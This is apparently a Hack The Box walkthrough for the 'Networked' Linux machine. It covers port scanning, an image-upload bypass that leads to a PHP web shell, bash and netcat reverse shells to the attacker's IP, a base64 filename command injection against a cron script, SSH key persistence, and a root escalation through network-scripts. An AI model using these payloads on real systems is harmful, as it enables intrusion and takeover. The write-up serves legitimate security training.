---
date: 2025-05-13
categories: [Linux, Easy]
---

![Networked](https://labs.hackthebox.com/storage/avatars/0b286019523dcd78cf03d3a3472a3792.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [guly](https://app.hackthebox.com/users/8292)        | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---








- The first step is to perform a scan of the open ports and then list the versions and technologies used on the open ports.

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.10.146 -oG scan
	/opt/extractports scan
	nmap -p22,80 -Pn -sCV 10.10.10.146 -oN ports
	```

  ![image](https://github.com/user-attachments/assets/5698697d-5798-4adf-abc3-e567bbc3d072)

- I start by accessing the website, but since I don’t find anything relevant, I decide to search for directories and `.php` files using `ffuf`.
	
	```python
	ffuf -c -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.146/FUZZ/ --mc=200 -e .php
	```
	
	![image](https://github.com/user-attachments/assets/71c6b598-1e35-4bbf-8eef-371eeaa7e1b5)

- Among the discovered directories, I find a compressed file. After downloading and extracting it, I see several PHP files that appear to be the same as those running on the website.

	![image](https://github.com/user-attachments/assets/ea291d82-9878-4b23-84c3-896e2626af92)

- Observing how the upload feature works, I notice that the file name must end with one of the allowed extensions. Additionally, the beginning of the file is checked to validate its type.
- To bypass these restrictions, I prepend the file with the magic bytes of a JPEG file and then append PHP code to see if the server interprets it.

  ![image](https://github.com/user-attachments/assets/3e070e5a-2352-4d26-bac1-207c60a8a119)

- After confirming that code execution is possible, I upload a file containing the following PHP code to establish a reverse shell:

```python
<?php 
    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4242 0>&1'");
?>
```

- This gives me a shell as the `apache` user. Now, I need to escalate privileges to the `guly` user in order to read the first system flag.
- While exploring the system, I find that the `guly` user has a script in his home directory that runs every 30 seconds. This script scans the website’s `uploads` folder and deletes any malicious files it finds.

	![image](https://github.com/user-attachments/assets/e5ff52fb-830a-4bbb-bc7f-5f8b099458c8)

	![image](https://github.com/user-attachments/assets/f2e6e61b-9f52-43d3-bc96-9495cda012a7)
	
- Two variables are used to define the path of the file to be deleted. One static and the other containing the file name.
- Since no input sanitization is applied, it's possible to terminate the `rm` command and inject arbitrary commands.
- Attempting to use the `/` character in the file name causes issues, so I decide to encode a reverse shell payload in base64 to bypass the restriction.

	```python
	nc -e /bin/bash 10.10.14.6 4444
	
	touch 'a; echo "bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjYgNDQ0NAo=" | base64 -d | sh'
	```

	![image](https://github.com/user-attachments/assets/7561861b-1b6e-4de2-a190-eb1e1a00bbea)

- With this reverse shell, I gain access as the `guly` user and can read the first system flag.
- For more convenient access to the system, I generate an SSH key pair and add the public key to the `authorized_keys` file to enable SSH login.

	```python
	ssh-keygen -f key
	cat key.pub
	echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /home/guly//.ssh/authorized_keys
	ssh -i key guly@10.10.10.146
	```

- At this point, I look for privilege escalation opportunities to gain root access. I begin checking for binaries that I can run without a password and find one.

	![image](https://github.com/user-attachments/assets/a54fe402-091e-4c6b-aa40-0f9148c6591d)

- The binary references a file in `/etc/sysconfig/network-scripts`. Upon investigating this path, I find a [post](https://seclists.org/fulldisclosure/2019/Apr/24) explaining that if a user has write permissions to a file in that directory, they can execute commands as root.
 
```sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

- Following this logic, I create a custom file containing the command `chmod u+s /bin/bash`. When the binary executes it as root, it sets the SUID bit on `/bin/bash`, allowing me to become root and read the second system flag.
	
	```python
	NAME=PEPE /tmp/privesc
	```
	
	![image](https://github.com/user-attachments/assets/4e204509-869b-4fbf-a443-88097601c4c8)
